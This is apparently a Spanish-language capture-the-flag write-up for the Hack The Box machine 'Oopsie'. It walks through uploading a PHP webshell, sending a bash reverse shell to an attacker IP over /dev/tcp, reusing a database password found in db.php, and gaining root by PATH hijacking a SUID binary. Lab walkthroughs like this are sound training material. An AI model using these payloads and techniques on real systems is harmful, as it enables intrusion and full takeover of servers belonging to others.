## Exploitation

Creamos un archivo `melvin.php` con una webshell.

```bash
echo '<?php system($_GET["cmd"]);' > melvin.php
```

Subimos la webshell.

![Oopsie Webservice File Upload](@images/writeups/hackthebox/machines/oopsie/oopsie-webservice-file-upload.png)

Probamos ejecutar comandos.

```bash
curl http://10.129.201.158/uploads/melvin.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```plaintext
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Nos ponemos en escucha en nuestra máquina atacante.

```bash
nc -lnvp 1111
```

Y nos enviamos una reverse shell.

```bash
curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.15.41/1111 0>&1"' http://10.129.201.158/uploads/melvin.php
```

Estabilizamos la shell.

```bash
script /dev/null -c bash
```

Presionamos `ctrl` + `z`.

```bash
stty raw -echo; fg
```

```bash
export TERM=xterm
```

```bash
export SHELL=bash
```

```bash
stty rows 38 columns 171
```

Listamos el contenido del directorio `home` de forma recursiva.

```bash
ls -R /home
```

```plaintext
/home:
robert

/home/robert:
user.txt
```

Leemos la flag.

```bash
cat /home/robert/user.txt 
```

## Privilege Escalation

Listamos el contenido del directorio `/var/www/html/cdn-cgi/login` y leemos el archivo `db.php` que contiene credenciales de la base de datos.

```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

La contraseña nos permite cambiar al usuario `robert`.

```bash
su robert
```

Buscamos binarios con el permiso SUID asignado que permiten a un usuario común ejecutar un binario con los mismos privilegios del propietario de ese archivo.

```bash
find / -type f -perm -4000 2>/dev/null
```

```plaintext
<SNIP>
/usr/bin/bugtracker
<SNIP>
```

Ejecutamos la herramienta para ver que hace.

```bash
bugtracker
```

```plaintext
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
When loading library in firmware it seems to be crashed

What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.

What happened instead:
Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
```

La herramienta pide el ID de un bug. Si le pasamos un ID inexistente muestra que ejecuta internamente la herramienta `cat`.

```plaintext
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 000000000
---------------

cat: /root/reports/000000000: No such file or directory
```

El usuario `robert` pertenece al grupo `bugtracker`.

```bash
robert@oopsie:/tmp$ id
```

```plaintext
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

Y los que pertenecen al grupo `bugtracker` tienen permisos para ejecutar el binario.

```bash
ls -l /usr/bin/bugtracker
```

```plaintext
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

Creamos un `cat` falso en el directorio `tmp` y agregamos el directorio `tmp` al `PATH` para que `bugtracker` busque el binario primero en el directorio `tmp` y ejecute nuestro `cat` falso que va a darnos una shell.

Creamos nuestra binario `cat`.

```bash
echo /bin/bash > /tmp/cat
```

Le damos permisos de ejecución.

```bash
chmod +x /tmp/cat
```

Agregamos la ruta `tmp` al `PATH`.

```bash
export PATH=/tmp:$PATH
```

Ejecutamos `bugtracker` para obtener una shell como `root`.

```bash
bugtracker
```

Una vez tengamos la shell como `root` nos cambiamos al directorio `/root` y leemos la flag con el binario `cat` original porque si no vamos a estar ejecutando el cat falso que usamos para obtener la shell como root.

```bash
/bin/cat /root/root.txt 
```
